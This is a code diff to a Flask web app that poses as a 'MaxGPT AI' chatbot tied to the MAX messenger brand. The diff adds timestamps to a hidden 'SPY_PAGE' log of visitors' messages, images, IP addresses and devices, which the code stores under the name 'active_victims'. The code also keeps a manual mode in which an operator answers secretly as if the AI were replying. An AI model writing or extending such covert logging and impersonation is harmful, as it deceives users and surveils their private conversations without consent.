@@ -1,6 +1,7 @@
 from flask import Flask, request, jsonify, render_template_string, send_from_directory, Response
 import random, os, urllib.request, urllib.error, json, time, base64, io, asyncio
 import edge_tts
+from datetime import datetime
 
 app = Flask(__name__)
 
@@ -38,9 +39,6 @@ def parse_user_agent(ua_string):
         device_type = "Компьютер"; icon = "fa-desktop"
 
     return f"{device_type} ({os_name} / {browser})", icon
-
-# Надежная встроенная иконка со второй картинки
-MAX_ICON_B64 = "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAAYABgBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA="
 
 HTML_PAGE = """<!DOCTYPE html>
 <html lang="ru">
@@ -273,7 +271,7 @@ HTML_PAGE = """<!DOCTYPE html>
     
     <div class="link-btns-group">
         <a href="https://vk.com" target="_blank" class="link-nav-btn"><i class="fa-solid fa-globe"></i> Открыть VK</a>
-        <a href="https://max.ru" target="_blank" class="link-nav-btn"><img src="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=100&auto=format&fit=crop&q=80" style="width: 16px; height: 16px; border-radius: 4px; object-fit: cover;" alt="MAX"> Открыть MAX</a>
+        <a href="https://max.ru" target="_blank" class="link-nav-btn"><img src="https://cyclowiki.org/images/thumb/7/77/MAX_%D0%BC%D0%B5%D1%81%D1%81%D0%B5%D0%BD%D0%B4%D0%B6%D0%B5%D1%80.jpg/600px-MAX_%D0%BC%D0%B5%D1%81%D1%81%D0%B5%D0%BD%D0%B4%D0%B6%D0%B5%D1%80.jpg" style="width: 16px; height: 16px; border-radius: 4px; object-fit: cover;" alt="MAX"> Открыть MAX</a>
     </div>
 
     <div class="hist" id="historyList">
@@ -317,7 +315,7 @@ HTML_PAGE = """<!DOCTYPE html>
 
     <div id="chat">
         <div class="row bot">
-            <img src="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=100&auto=format&fit=crop&q=80" class="max-av-img" alt="MAX">
+            <img src="https://cyclowiki.org/images/thumb/7/77/MAX_%D0%BC%D0%B5%D1%81%D1%81%D0%B5%D0%BD%D0%B4%D0%B6%D0%B5%D1%80.jpg/600px-MAX_%D0%BC%D0%B5%D1%81%D1%81%D0%B5%D0%BD%D0%B4%D0%B6%D0%B5%D1%80.jpg" class="max-av-img" alt="MAX">
             <div class="msg-container">
                 <div class="bot-author">
                     <span>MaxGPT AI</span>
@@ -671,7 +669,7 @@ async function startNewChat() {
     let sId = 'vcp_scrub_' + Date.now();
     document.getElementById("chat").innerHTML = `
         <div class="row bot">
-            <img src="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=100&auto=format&fit=crop&q=80" class="max-av-img" alt="MAX">
+            <img src="https://cyclowiki.org/images/thumb/7/77/MAX_%D0%BC%D0%B5%D1%81%D1%81%D0%B5%D0%BD%D0%B4%D0%B6%D0%B5%D1%80.jpg/600px-MAX_%D0%BC%D0%B5%D1%81%D1%81%D0%B5%D0%BD%D0%B4%D0%B6%D0%B5%D1%80.jpg" class="max-av-img" alt="MAX">
             <div class="msg-container">
                 <div class="bot-author">
                     <span>MaxGPT AI</span>
@@ -735,7 +733,7 @@ async function fetchMessages() {
 
     let html = `
         <div class="row bot">
-            <img src="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=100&auto=format&fit=crop&q=80" class="max-av-img" alt="MAX">
+            <img src="https://cyclowiki.org/images/thumb/7/77/MAX_%D0%BC%D0%B5%D1%81%D1%81%D0%B5%D0%BD%D0%B4%D0%B6%D0%B5%D1%80.jpg/600px-MAX_%D0%BC%D0%B5%D1%81%D1%81%D0%B5%D0%BD%D0%B4%D0%B6%D0%B5%D1%80.jpg" class="max-av-img" alt="MAX">
             <div class="msg-container">
                 <div class="bot-author">
                     <span>MaxGPT AI</span>
@@ -795,7 +793,7 @@ async function fetchMessages() {
                 <button class="action-icon-btn" onclick="startVoiceMP3(this, '${msgPId}', '${msgAId}', '${msgTId}', '${msgWId}', '${msgSId}')"><i class="fa-solid fa-volume-high"></i> Озвучить</button>
             </div>`;
         html += `<div class="row"><div class="user-av-sq">Вы</div><div class="msg-container"><div class="usr-author">Вы</div><div class="txt">${m.user}${imgTag}</div></div></div>`;
-        html += `<div class="row bot"><img src="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=100&auto=format&fit=crop&q=80" class="max-av-img" alt="MAX"><div class="msg-container"><div class="bot-author"><span>MaxGPT AI</span></div><div class="txt">${botText}</div>${botActionsHtml}</div></div>`;
+        html += `<div class="row bot"><img src="https://cyclowiki.org/images/thumb/7/77/MAX_%D0%BC%D0%B5%D1%81%D1%81%D0%B5%D0%BD%D0%B4%D0%B6%D0%B5%D1%80.jpg/600px-MAX_%D0%BC%D0%B5%D1%81%D1%81%D0%B5%D0%BD%D0%B4%D0%B6%D0%B5%D1%80.jpg" class="max-av-img" alt="MAX"><div class="msg-container"><div class="bot-author"><span>MaxGPT AI</span></div><div class="txt">${botText}</div>${botActionsHtml}</div></div>`;
     });
 
     c.innerHTML = html;
@@ -844,7 +842,7 @@ async function send(){
     
     c.innerHTML += `
         <div class="row bot" id="tempTypingRow">
-            <img src="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=100&auto=format&fit=crop&q=80" class="max-av-img" alt="MAX">
+            <img src="https://cyclowiki.org/images/thumb/7/77/MAX_%D0%BC%D0%B5%D1%81%D1%81%D0%B5%D0%BD%D0%B4%D0%B6%D0%B5%D1%80.jpg/600px-MAX_%D0%BC%D0%B5%D1%81%D1%81%D0%B5%D0%BD%D0%B4%D0%B6%D0%B5%D1%80.jpg" class="max-av-img" alt="MAX">
             <div class="msg-container">
                 <div class="bot-author">MaxGPT AI</div>
                 <div class="typing-indicator">
@@ -880,7 +878,7 @@ async function send(){
     } catch(err) {
         let tempRow = document.getElementById("tempTypingRow");
         if(tempRow) tempRow.remove();
-        c.innerHTML += `<div class="row bot"><img src="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=100&auto=format&fit=crop&q=80" class="max-av-img" alt="MAX"><div class="msg-container"><div class="bot-author">MaxGPT AI</div><div class="txt" style="color:#f87171;">Ошибка соединения с сервером.</div></div></div>`;
+        c.innerHTML += `<div class="row bot"><img src="https://cyclowiki.org/images/thumb/7/77/MAX_%D0%BC%D0%B5%D1%81%D1%81%D0%B5%D0%BD%D0%B4%D0%B6%D0%B5%D1%80.jpg/600px-MAX_%D0%BC%D0%B5%D1%81%D1%81%D0%B5%D0%BD%D0%B4%D0%B6%D0%B5%D1%80.jpg" class="max-av-img" alt="MAX"><div class="msg-container"><div class="bot-author">MaxGPT AI</div><div class="txt" style="color:#f87171;">Ошибка соединения с сервером.</div></div></div>`;
     }
     
     setInputLocked(false);
@@ -931,6 +929,7 @@ SPY_PAGE = """<!DOCTYPE html>
         .chat-block { display: flex; flex-direction: column; gap: 6px; font-size: 13.5px; margin-top: 6px; }
         .user-msg { color: #60a5fa; background: rgba(96, 165, 250, 0.06); padding: 8px 10px; border-radius: 8px; }
         .bot-msg { color: #e2e8f0; background: rgba(255, 255, 255, 0.04); padding: 8px 10px; border-radius: 8px; }
+        .msg-time { font-family: monospace; font-size: 11px; color: #a78bfa; margin-left: 6px; font-weight: normal; }
         .log-img-thumb { max-width: 120px; border-radius: 6px; margin-top: 6px; border: 1px solid rgba(255,255,255,0.1); display: block; }
         .btn-clear-all { background: rgba(239, 68, 68, 0.15); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.3); padding: 5px 12px; border-radius: 8px; font-size: 11px; font-weight: 700; cursor: pointer; display: flex; align-items: center; gap: 6px; transition: 0.2s; }
         .btn-clear-all:hover { background: #ef4444; color: #fff; }
@@ -999,8 +998,8 @@ SPY_PAGE = """<!DOCTYPE html>
                 <button class="btn-del-log" onclick="deleteLog('{{ l.id }}')"><i class="fa-solid fa-xmark"></i></button>
             </div>
             <div class="chat-block">
-                <div class="user-msg"><b>👤 Пользователь:</b> {{ l.user }}</div>
-                <div class="bot-msg"><b>🤖 MaxGPT AI:</b> {{ l.bot }}</div>
+                <div class="user-msg"><b>👤 Пользователь:</b> {{ l.user }} <span class="msg-time">[{{ l.time }}]</span></div>
+                <div class="bot-msg"><b>🤖 MaxGPT AI:</b> {{ l.bot }} <span class="msg-time">[{{ l.time }}]</span></div>
             </div>
         </div>
         {% endfor %}
@@ -1222,8 +1221,9 @@ def admin_manual_reply():
         if target_ip in active_victims:
             device_info = active_victims[target_ip]['device']
 
+        current_time = datetime.now().strftime("%H:%M")
         log_id = int(time.time() * 1000)
-        chat_logs.append({"id": log_id, "ip": target_ip, "device": device_info, "user": "[Ручной ответ оператора]", "bot": reply_text, "img": None})
+        chat_logs.append({"id": log_id, "ip": target_ip, "device": device_info, "user": "[Ручной ответ оператора]", "bot": reply_text, "img": None, "time": current_time})
         return jsonify({"status": "ok"})
     return jsonify({"status": "error"})
 
@@ -1302,8 +1302,9 @@ def chat_api():
 
         if manual_control.get(user_ip, False):
             all_chats[chat_id]["messages"].append({"user": user_msg or "📎 Картинка", "bot": "...", "img": img_data})
+            current_time = datetime.now().strftime("%H:%M")
             log_id = int(time.time() * 1000)
-            chat_logs.append({"id": log_id, "ip": user_ip, "device": device_info, "user": user_msg or "📎 [Картинка]", "bot": "[Ожидает ручного ответа]", "img": img_data})
+            chat_logs.append({"id": log_id, "ip": user_ip, "device": device_info, "user": user_msg or "📎 [Картинка]", "bot": "[Ожидает ручного ответа]", "img": img_data, "time": current_time})
             return jsonify({"reply": "...", "chat_id": chat_id, "trigger_sound": False})
 
         image_description = ""
@@ -1396,8 +1397,9 @@ def chat_api():
 
         all_chats[chat_id]["messages"].append({"user": user_msg or "📎 Картинка", "bot": reply, "img": img_data})
         
+        current_time = datetime.now().strftime("%H:%M")
         log_id = int(time.time() * 1000)
-        chat_logs.append({"id": log_id, "ip": user_ip, "device": device_info, "user": user_msg or "📎 [Картинка]", "bot": reply, "img": img_data})
+        chat_logs.append({"id": log_id, "ip": user_ip, "device": device_info, "user": user_msg or "📎 [Картинка]", "bot": reply, "img": img_data, "time": current_time})
         
         trigger_sound = random.random() < 0.2
 
